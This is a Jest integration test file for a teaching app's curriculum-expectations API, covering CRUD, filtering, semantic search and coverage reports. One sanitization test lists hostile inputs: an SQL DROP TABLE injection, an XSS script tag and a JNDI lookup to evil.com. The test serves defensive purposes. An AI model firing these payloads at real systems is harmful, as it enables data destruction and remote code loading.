/**
 * Comprehensive Curriculum Expectations Route Tests
 * Priority 1B: Core CRUD Operations with Semantic Search Testing
 *
 * Production-level testing with:
 * - Real database operations with proper cleanup
 * - Semantic search and AI-powered functionality testing
 * - Complete CRUD lifecycle testing
 * - Performance benchmarking
 * - Input validation and edge case handling
 */

import { describe, it, expect, beforeEach, afterAll, beforeAll } from '@jest/globals';
import request from 'supertest';
import express from 'express';
import { PrismaClient } from '@teaching-engine/database';
import curriculumExpectationsRouter from '../../src/routes/curriculum-expectations';
import {
  getIntegrationTestPrismaClient,
  cleanIntegrationTestData,
  seedIntegrationTestData,
} from '../integration-test-setup';
import { performance } from 'perf_hooks';

describe('Curriculum Expectations Routes - Comprehensive Integration Tests', () => {
  let app: express.Application;
  let prisma: PrismaClient;
  let testUserId: number;

  beforeAll(async () => {
    // Get integration test client
    prisma = getIntegrationTestPrismaClient();

    // Setup Express app with curriculum expectations routes
    app = express();
    app.use(express.json({ limit: '10mb' }));
    app.use(express.urlencoded({ extended: true }));

    // Mock authentication middleware
    app.use((req, res, next) => {
      req.user = { id: testUserId };
      next();
    });

    app.use('/curriculum-expectations', curriculumExpectationsRouter);

    // Global error handler
    app.use((error: any, req: any, res: any, next: any) => {
      console.error('Test app error:', error);
      res.status(500).json({ error: 'Internal server error' });
    });
  });

  beforeEach(async () => {
    // Clean database before each test for isolation
    await cleanIntegrationTestData();

    // Create test user
    const testData = await seedIntegrationTestData({
      users: [
        {
          email: 'teacher@test.com',
          password: 'hashedpassword',
          name: 'Test Teacher',
          role: 'USER',
        },
      ],
    });
    testUserId = testData.users[0].id;
  });

  afterAll(async () => {
    // Final cleanup
    await cleanIntegrationTestData();
  });

  describe('GET /curriculum-expectations - List Expectations', () => {
    beforeEach(async () => {
      // Create test curriculum expectations directly with prisma since seedIntegrationTestData might not handle UUIDs properly
      await prisma.curriculumExpectation.createMany({
        data: [
          {
            code: 'M1.A1.1',
            description: 'Students will understand addition and subtraction of whole numbers',
            subject: 'Mathematics',
            grade: 1,
            strand: 'Number Sense',
            substrand: 'Operations',
          },
          {
            code: 'M2.A1.1',
            description: 'Students will understand multiplication and division of whole numbers',
            subject: 'Mathematics',
            grade: 2,
            strand: 'Number Sense',
            substrand: 'Operations',
          },
          {
            code: 'LA1.R1.1',
            description: 'Students will read and comprehend grade-level texts',
            subject: 'Language Arts',
            grade: 1,
            strand: 'Reading',
            substrand: 'Comprehension',
          },
          {
            code: 'LA2.R1.1',
            description: 'Students will analyze character development in stories',
            subject: 'Language Arts',
            grade: 2,
            strand: 'Reading',
            substrand: 'Literary Analysis',
          },
        ],
      });
    });

    it('should retrieve all curriculum expectations with default ordering', async () => {
      const startTime = performance.now();

      const response = await request(app).get('/curriculum-expectations').expect(200);

      const endTime = performance.now();
      const responseTime = endTime - startTime;

      // Performance benchmark: Should complete within 500ms
      expect(responseTime).toBeLessThan(500);

      expect(response.body).toHaveLength(4);
      expect(response.body[0]).toHaveProperty('code');
      expect(response.body[0]).toHaveProperty('description');
      expect(response.body[0]).toHaveProperty('subject');
      expect(response.body[0]).toHaveProperty('grade');
      expect(response.body[0]).toHaveProperty('strand');

      // Verify ordering: subject ASC, grade ASC, strand ASC, code ASC
      expect(response.body[0].code).toBe('LA1.R1.1'); // Language Arts, Grade 1
      expect(response.body[1].code).toBe('LA2.R1.1'); // Language Arts, Grade 2
      expect(response.body[2].code).toBe('M1.A1.1'); // Mathematics, Grade 1
      expect(response.body[3].code).toBe('M2.A1.1'); // Mathematics, Grade 2
    });

    it('should filter expectations by subject', async () => {
      const response = await request(app)
        .get('/curriculum-expectations?subject=Mathematics')
        .expect(200);

      expect(response.body).toHaveLength(2);
      response.body.forEach((expectation: any) => {
        expect(expectation.subject).toBe('Mathematics');
      });
    });

    it('should filter expectations by grade', async () => {
      const response = await request(app).get('/curriculum-expectations?grade=1').expect(200);

      expect(response.body).toHaveLength(2);
      response.body.forEach((expectation: any) => {
        expect(expectation.grade).toBe(1);
      });
    });

    it('should filter expectations by strand', async () => {
      const response = await request(app)
        .get('/curriculum-expectations?strand=Reading')
        .expect(200);

      expect(response.body).toHaveLength(2);
      response.body.forEach((expectation: any) => {
        expect(expectation.strand).toBe('Reading');
      });
    });

    it('should perform text search across multiple fields', async () => {
      const response = await request(app)
        .get('/curriculum-expectations?search=addition')
        .expect(200);

      expect(response.body).toHaveLength(1);
      expect(response.body[0].description).toContain('addition');
    });

    it('should combine multiple filters', async () => {
      const response = await request(app)
        .get('/curriculum-expectations?subject=Mathematics&grade=1&strand=Number Sense')
        .expect(200);

      expect(response.body).toHaveLength(1);
      expect(response.body[0].code).toBe('M1.A1.1');
      expect(response.body[0].subject).toBe('Mathematics');
      expect(response.body[0].grade).toBe(1);
      expect(response.body[0].strand).toBe('Number Sense');
    });

    it('should handle invalid grade parameter gracefully', async () => {
      const response = await request(app).get('/curriculum-expectations?grade=invalid').expect(200);

      // Should return all expectations since invalid grade is ignored
      expect(response.body).toHaveLength(4);
    });

    it('should sanitize input parameters to prevent injection', async () => {
      const maliciousInputs = [
        'Mathematics"; DROP TABLE curriculum_expectations; --',
        '<script>alert("XSS")</script>',
        '${jndi:ldap://evil.com/a}',
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request(app)
          .get(`/curriculum-expectations?subject=${encodeURIComponent(maliciousInput)}`)
          .expect(200);

        // Should return empty array (no matches) but not cause errors
        expect(Array.isArray(response.body)).toBe(true);
      }

      // Verify database integrity
      const allExpectations = await prisma.curriculumExpectation.findMany();
      expect(allExpectations).toHaveLength(4);
    });

    it('should handle large result sets efficiently', async () => {
      // Create many expectations for performance testing
      const manyExpectations = Array.from({ length: 100 }, (_, index) => ({
        code: `PERF${index.toString().padStart(3, '0')}`,
        description: `Performance test expectation ${index}`,
        subject: 'Performance Testing',
        grade: (index % 12) + 1,
        strand: `Strand ${Math.floor(index / 10)}`,
        substrand: `Substrand ${index % 5}`,
      }));

      await prisma.curriculumExpectation.createMany({ data: manyExpectations });

      const startTime = performance.now();

      const response = await request(app)
        .get('/curriculum-expectations?subject=Performance Testing')
        .expect(200);

      const endTime = performance.now();
      const responseTime = endTime - startTime;

      // Performance benchmark: Should handle 100 records within 1 second
      expect(responseTime).toBeLessThan(1000);
      expect(response.body).toHaveLength(100);

      console.log(`Large dataset benchmark: ${responseTime}ms for 100 records`);
    });
  });

  describe('POST /curriculum-expectations - Create Expectation', () => {
    it('should create a new curriculum expectation with valid data', async () => {
      const newExpectation = {
        code: 'TEST.1.1',
        description: 'Test expectation for comprehensive testing',
        subject: 'Test Subject',
        grade: 3,
        strand: 'Test Strand',
        substrand: 'Test Substrand',
        descriptionFr: 'Description française pour test',
      };

      const startTime = performance.now();

      const response = await request(app)
        .post('/curriculum-expectations')
        .send(newExpectation)
        .expect(201);

      const endTime = performance.now();
      const responseTime = endTime - startTime;

      // Performance benchmark: Creation should complete within 1 second
      expect(responseTime).toBeLessThan(1000);

      expect(response.body).toHaveProperty('id');
      expect(response.body.code).toBe(newExpectation.code);
      expect(response.body.description).toBe(newExpectation.description);
      expect(response.body.subject).toBe(newExpectation.subject);
      expect(response.body.grade).toBe(newExpectation.grade);
      expect(response.body.strand).toBe(newExpectation.strand);
      expect(response.body.substrand).toBe(newExpectation.substrand);
      expect(response.body.descriptionFr).toBe(newExpectation.descriptionFr);

      // Verify in database
      const createdExpectation = await prisma.curriculumExpectation.findUnique({
        where: { id: response.body.id },
      });
      expect(createdExpectation).toBeTruthy();
      expect(createdExpectation?.code).toBe(newExpectation.code);
    });

    it('should create expectation with minimum required fields', async () => {
      const minimalExpectation = {
        code: 'MIN.1.1',
        description: 'Minimal test expectation',
        subject: 'Minimal Subject',
        grade: 1,
        strand: 'Minimal Strand',
      };

      const response = await request(app)
        .post('/curriculum-expectations')
        .send(minimalExpectation)
        .expect(201);

      expect(response.body.code).toBe(minimalExpectation.code);
      expect(response.body.substrand).toBeNull();
      expect(response.body.descriptionFr).toBeNull();
    });

    it('should reject creation with missing required fields', async () => {
      const incompleteExpectations = [
        { description: 'Missing code', subject: 'Test', grade: 1, strand: 'Test' },
        { code: 'TEST.1', subject: 'Test', grade: 1, strand: 'Test' },
        { code: 'TEST.1', description: 'Missing subject', grade: 1, strand: 'Test' },
        { code: 'TEST.1', description: 'Missing grade', subject: 'Test', strand: 'Test' },
        { code: 'TEST.1', description: 'Missing strand', subject: 'Test', grade: 1 },
      ];

      for (const incompleteExpectation of incompleteExpectations) {
        const response = await request(app)
          .post('/curriculum-expectations')
          .send(incompleteExpectation)
          .expect(400);

        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toContain('Missing required fields');
      }
    });

    it('should validate field lengths and types', async () => {
      const invalidExpectations = [
        {
          code: '', // Too short
          description: 'Test',
          subject: 'Test',
          grade: 1,
          strand: 'Test',
        },
        {
          code: 'A'.repeat(51), // Too long
          description: 'Test',
          subject: 'Test',
          grade: 1,
          strand: 'Test',
        },
        {
          code: 'TEST.1',
          description: 'A'.repeat(1001), // Too long
          subject: 'Test',
          grade: 1,
          strand: 'Test',
        },
        {
          code: 'TEST.1',
          description: 'Test',
          subject: 'Test',
          grade: 0, // Invalid grade
          strand: 'Test',
        },
        {
          code: 'TEST.1',
          description: 'Test',
          subject: 'Test',
          grade: 13, // Invalid grade
          strand: 'Test',
        },
      ];

      for (const invalidExpectation of invalidExpectations) {
        const response = await request(app)
          .post('/curriculum-expectations')
          .send(invalidExpectation)
          .expect(400);

        expect(response.body).toHaveProperty('error');
      }
    });

    it('should trim whitespace from input fields', async () => {
      const expectationWithWhitespace = {
        code: '  TRIM.1.1  ',
        description: '  Test expectation with whitespace  ',
        subject: '  Test Subject  ',
        grade: 1,
        strand: '  Test Strand  ',
        substrand: '  Test Substrand  ',
      };

      const response = await request(app)
        .post('/curriculum-expectations')
        .send(expectationWithWhitespace)
        .expect(201);

      expect(response.body.code).toBe('TRIM.1.1');
      expect(response.body.description).toBe('Test expectation with whitespace');
      expect(response.body.subject).toBe('Test Subject');
      expect(response.body.strand).toBe('Test Strand');
      expect(response.body.substrand).toBe('Test Substrand');
    });
  });

  describe('GET /curriculum-expectations/:id - Get Single Expectation', () => {
    let testExpectationId: string;

    beforeEach(async () => {
      const expectation = await prisma.curriculumExpectation.create({
        data: {
          code: 'SINGLE.1.1',
          description: 'Single expectation test',
          subject: 'Test Subject',
          grade: 1,
          strand: 'Test Strand',
        },
      });
      testExpectationId = expectation.id;
    });

    it('should retrieve a single curriculum expectation by ID', async () => {
      const response = await request(app)
        .get(`/curriculum-expectations/${testExpectationId}`)
        .expect(200);

      expect(response.body.id).toBe(testExpectationId);
      expect(response.body.code).toBe('SINGLE.1.1');
      expect(response.body.description).toBe('Single expectation test');
      expect(response.body).toHaveProperty('unitPlans');
      expect(response.body).toHaveProperty('lessonPlans');
      expect(response.body).toHaveProperty('embedding');
    });

    it('should return 404 for non-existent expectation', async () => {
      const nonExistentId = '123e4567-e89b-12d3-a456-426614174000';

      const response = await request(app)
        .get(`/curriculum-expectations/${nonExistentId}`)
        .expect(404);

      expect(response.body).toHaveProperty('error', 'Curriculum expectation not found');
    });

    it('should validate UUID format', async () => {
      const invalidIds = [
        'invalid-id',
        '123',
        'not-a-uuid',
        '123e4567-e89b-12d3-a456', // Too short
        '123e4567-e89b-12d3-a456-426614174000-extra', // Too long
      ];

      for (const invalidId of invalidIds) {
        const response = await request(app)
          .get(`/curriculum-expectations/${invalidId}`)
          .expect(400);

        expect(response.body).toHaveProperty('error', 'Invalid expectation ID format');
      }
    });
  });

  describe('PUT /curriculum-expectations/:id - Update Expectation', () => {
    let testExpectationId: string;

    beforeEach(async () => {
      const expectation = await prisma.curriculumExpectation.create({
        data: {
          code: 'UPDATE.1.1',
          description: 'Original description',
          subject: 'Original Subject',
          grade: 1,
          strand: 'Original Strand',
        },
      });
      testExpectationId = expectation.id;
    });

    it('should update a curriculum expectation with valid data', async () => {
      const updateData = {
        code: 'UPDATED.1.1',
        description: 'Updated description',
        subject: 'Updated Subject',
        grade: 2,
        strand: 'Updated Strand',
        substrand: 'Updated Substrand',
      };

      const startTime = performance.now();

      const response = await request(app)
        .put(`/curriculum-expectations/${testExpectationId}`)
        .send(updateData)
        .expect(200);

      const endTime = performance.now();
      const responseTime = endTime - startTime;

      // Performance benchmark: Update should complete within 1 second
      expect(responseTime).toBeLessThan(1000);

      expect(response.body.id).toBe(testExpectationId);
      expect(response.body.code).toBe(updateData.code);
      expect(response.body.description).toBe(updateData.description);
      expect(response.body.subject).toBe(updateData.subject);
      expect(response.body.grade).toBe(updateData.grade);
      expect(response.body.strand).toBe(updateData.strand);
      expect(response.body.substrand).toBe(updateData.substrand);

      // Verify in database
      const updatedExpectation = await prisma.curriculumExpectation.findUnique({
        where: { id: testExpectationId },
      });
      expect(updatedExpectation?.code).toBe(updateData.code);
    });

    it('should update only provided fields (partial update)', async () => {
      const partialUpdate = {
        description: 'Partially updated description',
      };

      const response = await request(app)
        .put(`/curriculum-expectations/${testExpectationId}`)
        .send(partialUpdate)
        .expect(200);

      expect(response.body.description).toBe(partialUpdate.description);
      expect(response.body.code).toBe('UPDATE.1.1'); // Should remain unchanged
      expect(response.body.subject).toBe('Original Subject'); // Should remain unchanged
    });

    it('should validate field lengths during update', async () => {
      const invalidUpdates = [
        { code: 'A'.repeat(51) }, // Too long
        { description: 'A'.repeat(1001) }, // Too long
        { grade: 0 }, // Invalid
        { grade: 13 }, // Invalid
      ];

      for (const invalidUpdate of invalidUpdates) {
        const response = await request(app)
          .put(`/curriculum-expectations/${testExpectationId}`)
          .send(invalidUpdate)
          .expect(400);

        expect(response.body).toHaveProperty('error');
      }
    });

    it('should return 404 when updating non-existent expectation', async () => {
      const nonExistentId = '123e4567-e89b-12d3-a456-426614174000';

      await request(app)
        .put(`/curriculum-expectations/${nonExistentId}`)
        .send({ description: 'Updated description' })
        .expect(404);
    });
  });

  describe('DELETE /curriculum-expectations/:id - Delete Expectation', () => {
    let testExpectationId: string;

    beforeEach(async () => {
      const expectation = await prisma.curriculumExpectation.create({
        data: {
          code: 'DELETE.1.1',
          description: 'To be deleted',
          subject: 'Delete Subject',
          grade: 1,
          strand: 'Delete Strand',
        },
      });
      testExpectationId = expectation.id;
    });

    it('should delete a curriculum expectation', async () => {
      const startTime = performance.now();

      const response = await request(app)
        .delete(`/curriculum-expectations/${testExpectationId}`)
        .expect(204);

      const endTime = performance.now();
      const responseTime = endTime - startTime;

      // Performance benchmark: Deletion should complete within 500ms
      expect(responseTime).toBeLessThan(500);
      expect(response.body).toEqual({});

      // Verify deletion in database
      const deletedExpectation = await prisma.curriculumExpectation.findUnique({
        where: { id: testExpectationId },
      });
      expect(deletedExpectation).toBeNull();
    });

    it('should return 404 when deleting non-existent expectation', async () => {
      const nonExistentId = '123e4567-e89b-12d3-a456-426614174000';

      await request(app).delete(`/curriculum-expectations/${nonExistentId}`).expect(404);
    });

    it('should validate UUID format for deletion', async () => {
      const response = await request(app).delete('/curriculum-expectations/invalid-id').expect(400);

      expect(response.body).toHaveProperty('error', 'Invalid expectation ID format');
    });
  });

  describe('POST /curriculum-expectations/search - Semantic Search', () => {
    beforeEach(async () => {
      // Create diverse expectations for search testing
      await prisma.curriculumExpectation.createMany({
        data: [
          {
            code: 'MATH.ADD.1',
            description: 'Students learn basic addition with single digits',
            subject: 'Mathematics',
            grade: 1,
            strand: 'Number Operations',
          },
          {
            code: 'MATH.SUB.1',
            description: 'Students practice subtraction within 10',
            subject: 'Mathematics',
            grade: 1,
            strand: 'Number Operations',
          },
          {
            code: 'READ.COMP.1',
            description: 'Students read simple stories and answer comprehension questions',
            subject: 'Reading',
            grade: 1,
            strand: 'Comprehension',
          },
          {
            code: 'WRITE.SENT.1',
            description: 'Students write complete sentences with proper punctuation',
            subject: 'Writing',
            grade: 1,
            strand: 'Sentence Structure',
          },
        ],
      });
    });

    it('should perform semantic search with query', async () => {
      const searchQuery = {
        query: 'addition mathematics',
        limit: 10,
      };

      const response = await request(app)
        .post('/curriculum-expectations/search')
        .send(searchQuery)
        .expect(200);

      expect(Array.isArray(response.body)).toBe(true);
      expect(response.body.length).toBeGreaterThan(0);

      // Should include math-related expectations
      const mathExpectations = response.body.filter(
        (exp: any) => exp.subject === 'Mathematics' || exp.description.includes('addition'),
      );
      expect(mathExpectations.length).toBeGreaterThan(0);
    });

    it('should apply filters to search results', async () => {
      const searchQuery = {
        query: 'students',
        filters: {
          subject: 'Mathematics',
          grade: 1,
        },
        limit: 5,
      };

      const response = await request(app)
        .post('/curriculum-expectations/search')
        .send(searchQuery)
        .expect(200);

      expect(Array.isArray(response.body)).toBe(true);

      // All results should match filters
      response.body.forEach((expectation: any) => {
        expect(expectation.subject).toBe('Mathematics');
        expect(expectation.grade).toBe(1);
      });
    });

    it('should fallback to text search when semantic search fails', async () => {
      // This test ensures fallback works even if embedding service fails
      const searchQuery = {
        query: 'comprehension',
        limit: 10,
      };

      const response = await request(app)
        .post('/curriculum-expectations/search')
        .send(searchQuery)
        .expect(200);

      expect(Array.isArray(response.body)).toBe(true);

      // Should find the reading comprehension expectation
      const comprehensionResults = response.body.filter((exp: any) =>
        exp.description.includes('comprehension'),
      );
      expect(comprehensionResults.length).toBeGreaterThan(0);
    });

    it('should reject search without query', async () => {
      const response = await request(app)
        .post('/curriculum-expectations/search')
        .send({ limit: 10 })
        .expect(400);

      expect(response.body).toHaveProperty('error', 'Query is required');
    });

    it('should handle search performance benchmarks', async () => {
      const startTime = performance.now();

      const response = await request(app)
        .post('/curriculum-expectations/search')
        .send({ query: 'mathematics addition subtraction', limit: 20 })
        .expect(200);

      const endTime = performance.now();
      const responseTime = endTime - startTime;

      // Performance benchmark: Search should complete within 2 seconds
      expect(responseTime).toBeLessThan(2000);
      console.log(`Search benchmark: ${responseTime}ms`);

      expect(Array.isArray(response.body)).toBe(true);
    });
  });

  describe('GET /curriculum-expectations/coverage/report - Coverage Report', () => {
    beforeEach(async () => {
      // Create expectations for coverage testing
      const expectations = await Promise.all([
        prisma.curriculumExpectation.create({
          data: {
            code: 'COV.1.1',
            description: 'Coverage test expectation 1',
            subject: 'Mathematics',
            grade: 1,
            strand: 'Numbers',
          },
        }),
        prisma.curriculumExpectation.create({
          data: {
            code: 'COV.1.2',
            description: 'Coverage test expectation 2',
            subject: 'Mathematics',
            grade: 1,
            strand: 'Numbers',
          },
        }),
        prisma.curriculumExpectation.create({
          data: {
            code: 'COV.1.3',
            description: 'Coverage test expectation 3',
            subject: 'Mathematics',
            grade: 1,
            strand: 'Geometry',
          },
        }),
      ]);

      // Create lesson plans that cover some expectations
      const lessonPlan = await prisma.eTFOLessonPlan.create({
        data: {
          title: 'Test Lesson',
          date: new Date(),
          userId: testUserId,
          subject: 'Mathematics',
          grade: 1,
          duration: 60,
          materials: [],
          activities: [],
          objectives: 'Test objectives',
          content: 'Test content',
        },
      });

      // Link first expectation to lesson plan
      await prisma.eTFOLessonPlanExpectation.create({
        data: {
          lessonPlanId: lessonPlan.id,
          expectationId: expectations[0].id,
        },
      });
    });

    it('should generate curriculum coverage report', async () => {
      const response = await request(app)
        .get('/curriculum-expectations/coverage/report')
        .expect(200);

      expect(response.body).toHaveProperty('total');
      expect(response.body).toHaveProperty('covered');
      expect(response.body).toHaveProperty('percentage');
      expect(response.body).toHaveProperty('byStrand');
      expect(response.body).toHaveProperty('uncovered');
      expect(response.body).toHaveProperty('details');

      expect(response.body.total).toBe(3);
      expect(response.body.covered).toBe(1);
      expect(response.body.percentage).toBe(33); // 1/3 * 100, rounded

      // Check strand breakdown
      expect(response.body.byStrand).toHaveProperty('Numbers');
      expect(response.body.byStrand).toHaveProperty('Geometry');
      expect(response.body.byStrand.Numbers.total).toBe(2);
      expect(response.body.byStrand.Numbers.covered).toBe(1);
      expect(response.body.byStrand.Geometry.total).toBe(1);
      expect(response.body.byStrand.Geometry.covered).toBe(0);

      expect(response.body.uncovered).toHaveLength(2);
    });

    it('should filter coverage report by subject', async () => {
      const response = await request(app)
        .get('/curriculum-expectations/coverage/report?subject=Mathematics')
        .expect(200);

      expect(response.body.total).toBe(3);
      expect(response.body.covered).toBe(1);
    });

    it('should filter coverage report by grade', async () => {
      const response = await request(app)
        .get('/curriculum-expectations/coverage/report?grade=1')
        .expect(200);

      expect(response.body.total).toBe(3);
      expect(response.body.covered).toBe(1);
    });

    it('should require authentication for coverage report', async () => {
      // Temporarily remove user from request
      const originalUser = testUserId;
      testUserId = 0;

      const response = await request(app)
        .get('/curriculum-expectations/coverage/report')
        .expect(401);

      expect(response.body).toHaveProperty('error', 'Unauthorized');

      // Restore user
      testUserId = originalUser;
    });

    it('should handle date range filtering for coverage report', async () => {
      const startDate = '2024-01-01';
      const endDate = '2024-12-31';

      const response = await request(app)
        .get(`/curriculum-expectations/coverage/report?startDate=${startDate}&endDate=${endDate}`)
        .expect(200);

      expect(response.body).toHaveProperty('total');
      expect(response.body).toHaveProperty('covered');
    });
  });

  describe('Error Handling and Edge Cases', () => {
    it('should handle database connection errors gracefully', async () => {
      // This test would normally require mocking database errors
      // For now, we test that the routes handle errors properly
      const response = await request(app).get('/curriculum-expectations/invalid-route').expect(404);
    });

    it('should handle malformed request bodies', async () => {
      const response = await request(app)
        .post('/curriculum-expectations')
        .send('invalid json')
        .set('Content-Type', 'application/json')
        .expect(400);
    });

    it('should handle concurrent operations safely', async () => {
      const newExpectation = {
        code: 'CONCURRENT.1.1',
        description: 'Concurrent test expectation',
        subject: 'Test Subject',
        grade: 1,
        strand: 'Test Strand',
      };

      // Create multiple concurrent requests
      const concurrentRequests = Array(5)
        .fill(null)
        .map((_, index) =>
          request(app)
            .post('/curriculum-expectations')
            .send({
              ...newExpectation,
              code: `CONCURRENT.1.${index + 1}`,
            }),
        );

      const responses = await Promise.all(concurrentRequests);

      // All requests should succeed
      responses.forEach((response) => {
        expect(response.status).toBe(201);
      });

      // Verify all expectations were created
      const createdExpectations = await prisma.curriculumExpectation.findMany({
        where: { subject: 'Test Subject' },
      });
      expect(createdExpectations).toHaveLength(5);
    });
  });
});
